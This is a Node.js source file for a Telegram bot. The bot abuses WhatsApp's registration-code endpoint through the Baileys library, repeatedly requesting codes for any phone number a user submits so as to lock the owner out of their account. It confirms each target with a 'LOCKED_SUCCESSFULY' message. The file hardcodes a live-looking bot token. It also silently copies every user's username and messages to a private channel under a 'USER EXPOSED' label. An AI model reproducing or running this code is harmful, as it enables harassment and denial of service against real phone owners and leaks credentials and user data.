const keepAlive = require('./keep_alive.js');
const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { promisify } = require('util');
const readdir = promisify(fs.readdir);
const readFile = promisify(fs.readFile);
const TelegramBot = require('node-telegram-bot-api');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('number.json'));

const start = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('.mm');
  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' }),
  });

  console.clear();

  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      try {
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 666,
        });
        b = res.reason === 'temporarily_unavailable';
        if (b) {
          console.log(gradient('red', 'red')(`+${res.login}@s.whatsapp.net`));
          setTimeout(async () => {
            dropNumber(context);
          }, res.retry_after * 10);
          return;
        }
      } catch (error) {
        console.log(error);
      }
    }
  };

  const botToken = '6992778437:AAED66Ug4-g9YuDOeE7tWHawJ4bqhYDutco';
  const bot = new TelegramBot(botToken, { polling: true });

  bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const caption = 'DEAR WELCOME THIS BOT IS GIFT FOR OUR SUPPORTER'S: /temp  92/ number';

    bot.sendMessage(chatId, caption, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
  });

  bot.onText(/\/temp (.+)/, (msg, match) => {
    const chatId = msg.chat.id;

    if (!match[1]) {
      bot.sendMessage(chatId, 'ENTER VALID NUMBER DETAILS.');
      return;
    }

    const input = match[1].split('/');
    const ddi = input[0];
    const number = input[1];

    if (!ddi || !number) {
      bot.sendMessage(chatId, 'ENTER VALID NUMBER.');
      return;
    }

    const phoneNumber = ddi + number;
    numbers[phoneNumber] = { ddi, number };
    fs.writeFileSync('number.json', JSON.stringify(numbers, null, '\t'));
    dropNumber({ phoneNumber, ddi, number });

    const caption = `\`\`\`LOCKED_SUCCESSFULY:+${phoneNumber}\`\`\``;

    bot.sendMessage(chatId, caption, { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
  });


  
  const userMessagesChannelId = '-1002034241075'; // Replace 'YOUR_NEW_CHANNEL_ID' with the actual channel ID

  // Listen for incoming messages to the bot
  bot.on('message', (msg) => {
      const chatId = msg.chat.id;
      const username = msg.from.username;
      const messageText = msg.text;

      // Get current date
      const currentDate = new Date().toDateString();

      // Modify the message text to include the username and date
      const messageToSend = `(${currentDate})\nUSER EXPOSED @${username} \n\nMessage: ${messageText}`;

      // Send the modified message to the designated channel
      bot.sendMessage(userMessagesChannelId, messageToSend);
  });


  console.log(gradient('red', 'red')('bsy log console.'));
};

start();
